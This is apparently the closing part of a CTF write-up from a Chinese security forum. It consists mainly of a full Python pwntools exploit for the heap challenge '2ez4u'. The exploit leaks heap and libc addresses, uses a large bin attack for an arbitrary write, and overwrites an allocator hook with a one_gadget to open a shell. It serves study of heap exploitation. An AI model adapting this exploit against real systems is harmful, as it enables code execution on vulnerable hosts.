
```python
#!/usr/bin/env python2.7

# -*- coding: utf-8 -*-



from __future__ import print_function

from pwn import *

from ctypes import c_uint32



context.arch = 'x86-64'

context.os = 'linux'

context.log_level = 'DEBUG'



io = process("./2ez4u", env = {"LD_PRELOAD" : "./libc.so"})



base_addr = 0x0000555555554000



def add(l, desc):

    io.recvuntil('your choice:')

    io.sendline('1')

    io.recvuntil('color?(0:red, 1:green):')

    io.sendline('0')

    io.recvuntil('value?(0-999):')

    io.sendline('0')

    io.recvuntil('num?(0-16)')

    io.sendline('0')

    io.recvuntil('description length?(1-1024):')

    io.sendline(str(l))

    io.recvuntil('description of the apple:')

    io.sendline(desc)

    #pass



def dele(idx):

    io.recvuntil('your choice:')

    io.sendline('2')

    io.recvuntil('which?(0-15):')

    io.sendline(str(idx))

    #pass



def edit(idx, desc):

    io.recvuntil('your choice:')

    io.sendline('3')

    io.recvuntil('which?(0-15):')

    io.sendline(str(idx))

    io.recvuntil('color?(0:red, 1:green):')

    io.sendline('2')

    io.recvuntil('value?(0-999):')

    io.sendline('1000')

    io.recvuntil('num?(0-16)')

    io.sendline('17')

    io.recvuntil('new description of the apple:')

    io.sendline(desc)

    #pass



def show(idx):

    io.recvuntil('your choice:')

    io.sendline('4')

    io.recvuntil('which?(0-15):')

    io.sendline(str(idx))

    #pass



add(0x60,  '0'*0x60 ) # 

add(0x60,  '1'*0x60 ) #

add(0x60,  '2'*0x60 ) #

add(0x60,  '3'*0x60 ) #

add(0x60,  '4'*0x60 ) #

add(0x60,  '5'*0x60 ) #

add(0x60,  '6'*0x60 ) #



add(0x3f0, '7'*0x3f0) # playground

add(0x30,  '8'*0x30 )

add(0x3e0, '9'*0x3d0) # sup

add(0x30,  'a'*0x30 )

add(0x3f0, 'b'*0x3e0) # victim

add(0x30,  'c'*0x30 )



dele(0x9)

dele(0xb)

dele(0x0)

add(0x400, '0'*0x400)



# leak

show(0xb)

io.recvuntil('num: ')

print(hex(c_uint32(int(io.recvline()[:-1])).value))



io.recvuntil('description:')

HEAP = u64(io.recvline()[:-1]+'\x00\x00')-0x7e0

log.info("heap base 0x%016x" % HEAP)



target_addr = HEAP+0xb0     # 1

chunk1_addr = HEAP+0x130    # 2

chunk2_addr = HEAP+0x1b0    # 3

victim_addr = HEAP+0xc30    # b



# large bin attack

edit(0xb, p64(chunk1_addr))             # victim

edit(0x1, p64(0x0)+p64(chunk1_addr))    # target



chunk2  = p64(0x0)

chunk2 += p64(0x0)

chunk2 += p64(0x421)

chunk2 += p64(0x0)

chunk2 += p64(0x0)

chunk2 += p64(chunk1_addr)

edit(0x3, chunk2) # chunk2



chunk1  = ''

chunk1 += p64(0x0)

chunk1 += p64(0x0)

chunk1 += p64(0x411)

chunk1 += p64(target_addr-0x18)

chunk1 += p64(target_addr-0x10)

chunk1 += p64(victim_addr)

chunk1 += p64(chunk2_addr)



edit(0x2, chunk1) # chunk1

edit(0x7, '7'*0x198+p64(0x410)+p64(0x411))



dele(0x6)

dele(0x3)

add(0x3f0, '3'*0x30+p64(0xdeadbeefdeadbeef)) # chunk1, arbitrary write !!!!!!!

add(0x60,  '6'*0x60 ) # 



show(0x3)

io.recvuntil('3'*0x30)

io.recv(8)

LIBC = u64(io.recv(6)+'\x00\x00')-0x3c4be8

log.info("libc base 0x%016x" % LIBC)



junk  = ''

junk += '3'*0x30

junk += p64(0x81)

junk += p64(LIBC+0x3c4be8)

junk += p64(HEAP+0x300)

junk  = junk.ljust(0xa8, 'A')

junk += p64(0x80)



recovery  = ''

recovery += junk

recovery += p64(0x80) # 0x4->size

recovery += p64(0x60) # 0x4->fd



dele(0x5)

dele(0x4)



edit(0x3, recovery) # victim, start from HEAP+0x158



add(0x60,  '4'*0x60 ) # 



recovery  = ''

recovery += junk

recovery += p64(0x70) # 0x4->size

recovery += p64(0x0) # 0x4->fd

edit(0x3, recovery) # victim, start from HEAP+0x158



add(0x40,  '5'*0x30 ) # 



dele(0x5)

gdb.attach(io, 'b *0x%x' % (base_addr+0x124e))

recovery  = ''

recovery += '3'*0x30

recovery += p64(0x61)

recovery += p64(LIBC+0x3c4b50)

edit(0x3, recovery) # victim, start from HEAP+0x158



add(0x40,  '5'*0x30 ) # 



add(0x40,  p64(LIBC+0x3c5c50)) # 



# recovery

edit(0xb, p64(HEAP+0x7e0))

dele(0x6)



add(0x300, '\x00') # 

add(0x300, '\x00') # 

add(0x300, '\x00') # 

add(0x300, '\x00') # 

add(0x300, '/bin/sh') # 

dele(0x1)

add(0x300, '\x00'*0x1d0+p64(LIBC+0x4526a)) # 



dele(15)



io.interactive()

```

![](https://bbs.kanxue.com/upload/attach/201902/3_BKYFC54K3D5S7XB.png)

## 参考文章及题目链接

716K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6x3b7#2c8r3i4K6u0r3e0p5y4f1c8U0t1H3x3e0N6Q4x3V1k6@1M7X3g2W2i4K6u0r3L8h3q4K6N6r3g2J5i4K6u0r3M7%4u0U0i4K6u0r3M7s2N6F1i4K6u0r3x3X3g2\*7y4s2f1`.

这篇wp也发在了我的博客上，欢迎mark~

d20K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3g2@1k6i4u0F1j5h3I4K6j5h3E0#2M7X3p5I4x3#2)9J5k6h3y4G2L8g2)9J5c8U0t1H3x3e0S2Q4x3V1j5H3x3#2)9J5c8U0t1I4i4K6u0r3L8r3y4@1k6U0u0Q4x3V1j5`.

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

最后于  2019-2-2 16:15

被admin编辑

，原因： 图片本地化
